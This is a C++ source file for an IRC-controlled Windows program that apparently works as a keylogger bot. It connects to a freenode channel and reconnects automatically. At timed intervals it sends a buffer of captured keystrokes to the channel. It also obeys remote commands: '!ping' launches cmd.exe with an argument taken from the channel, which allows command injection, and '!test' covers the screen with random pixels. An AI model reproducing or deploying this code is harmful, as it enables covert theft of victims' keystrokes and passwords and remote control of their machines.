#include "MyIrc.h"
#include <windows.h>

MyIrc::MyIrc() {
    GetSystemTime(&_lastTimestamp);
    setGoodTimestamp();
    _dico[":*** Checking Ident\r\n"] = &MyIrc::login;
    _dico[":*** No Ident response\r\n"] = &MyIrc::login;
    _dico[":Nickname is already in use.\r\n"] = &MyIrc::alterLogin;
    _dico["PING :cameron.freenode.net\r\n"] = &MyIrc::pingServ;
    _cmd[":!quit\r\n"] = &MyIrc::quit;
    _cmd[":!ping\r\n"] = &MyIrc::ping;
    _cmd[":!test\r\n"] = &MyIrc::test;
}

MyIrc::~MyIrc() {
    std::string                     chan(CHAN);

    quit(chan, chan);
}

std::string                         MyIrc::strtockf(std::string str, char delim) {
    size_t                          i = -1;
    std::string                     reply;
    int                             find = 0;

    if (str != "") {
        while (++i < str.length()) {
            if (str[i] == delim)
                find += 1;
            if (find == 2)
                reply += str[i];
        }
    }
    return (reply);
}

bool                                MyIrc::init(std::string user, std::string addr, int port) {
    std::string                     chan(CHAN);

    if (_cli.connex(addr, port) ||
        getData(user, chan))
        return (true);
    return (false);
}

void                                MyIrc::setGoodTimestamp() {
    if (_lastTimestamp.wSecond + TIME >= 60)
        _lastTimestamp.wSecond = TIME;
    else
        _lastTimestamp.wSecond += TIME;
}

bool                                MyIrc::saveCo() {
    std::string                     chan(CHAN);

    while (1) {
        std::string                 data(_cli.recvData());
        std::string                 cmd(strtockf(data, ':'));

        /*debug*/
        //if (data != "")
            //std::cout << "<<<<<<< " << data << std::endl;
        /*_____*/
        if (_dico[data] && (this->*_dico[data])(data, data))
            return (true);
        else {
            if (_cmd[cmd] && (this->*_cmd[cmd])(chan, cmd))
                return (true);
        }
        GetSystemTime(&_currentTimestamp);
        _key.getKey();
        sendKeyBuff(chan);
        if (!_cli.getCurrentCoStatu())
            load(true);
    }
    return (false);
}

bool                                MyIrc::load(bool clean) {
    if (clean) {
        _cli.setCurrentCoStatu();
        _cli.rezSock();
        Sleep(TIME * 1000);
    }
    if (init(_computerName, IP, PORT))
        std::cout << "Loaded" << std::endl;
    if (saveCo())
        return (true);
    return (false);
}

void                                MyIrc::setComputerName(std::string computerName) {
    _computerName = computerName;
}

void                                MyIrc::sendKeyBuff(std::string &chan) {
    if (_currentTimestamp.wSecond >= _lastTimestamp.wSecond) {
        _currentTimestamp = _lastTimestamp;
        setGoodTimestamp();
        if ((_key.getBuffer() != "<get><key>") || (_key.getBuffer().size() >= 512)) {
            _cli.sendData("PRIVMSG #" + chan + " :" + _key.getBuffer() + "</key></get>\r\n");
            _key.cleanBuff();
        }
        _key.setStat();
    }
}

bool                                MyIrc::getData(std::string &user, std::string &chan) {
    std::string                     data(strtockf(_cli.recvData(), ':'));
 
    if (_dico[data] && (this->*_dico[data])(user, chan))
        return (true);
    if (data.length() > 50) {
        if (chanJoin(chan, chan))
            return (true);
    }
    if (getData(user, chan))
        return (true);
    return (false);
}

bool                                MyIrc::login(std::string &user, std::string&) {
    if (_cli.sendData("USER " + user + " 8 * :??????\r\n") ||
        _cli.sendData("NICK " + user + "\r\n"))
        return (true);
    return (false);
}

bool                                MyIrc::alterLogin(std::string &user, std::string&) {
    std::stringstream               id;

    id << static_cast<int>(GetCurrentProcessId());
    if (_cli.sendData("USER " + user + "_" + id.str() + " 8 * :??????\r\n") ||
        _cli.sendData("NICK " + user + "_" + id.str() + "\r\n"))
        return (true);
    return (false);
}

bool                                MyIrc::chanJoin(std::string&, std::string &chan) {
    if (_cli.sendData("JOIN #" + chan + "\r\n"))
        return (true);
    return (true);
}

bool                                MyIrc::pingServ(std::string&, std::string&) {
    if (_cli.sendData("PONG :cameron.freenode.net\r\n"))
        return (true);
    return (false);
}

bool                                MyIrc::quit(std::string& chan, std::string&) {
    _cli.sendData("PRIVMSG #" + chan + " :Bye !\r\n");
    _cli.sendData("PART #" + chan + " :bye touS le monde\r\n");
    _cli.sendData("QUIT\r\n");
    return (true);
}

bool                                MyIrc::ping(std::string&, std::string& cmd) {
    std::string                     param(strtockf(cmd, ' '));
    
    if (param == "")
        param = std::string("google.fr");
    ShellExecute(0, "open", "cmd.exe", std::string("/c ping " + param + " -t").c_str(), NULL, SW_SHOWNORMAL);
    return (false);
}

bool                                MyIrc::test(std::string&, std::string&) {
    int                             x;
    int                             y;
    
    y = -1;
    HDC hdc = GetDC(NULL);
    while(++y < 1080)
    {
        x = -1;
        while (++x < 1920) {
            SetPixel(hdc, x, y, RGB(rand() % 255 + 1, rand() % 255 + 1, rand() % 255 + 1));
        }
    }
    return (false);
}
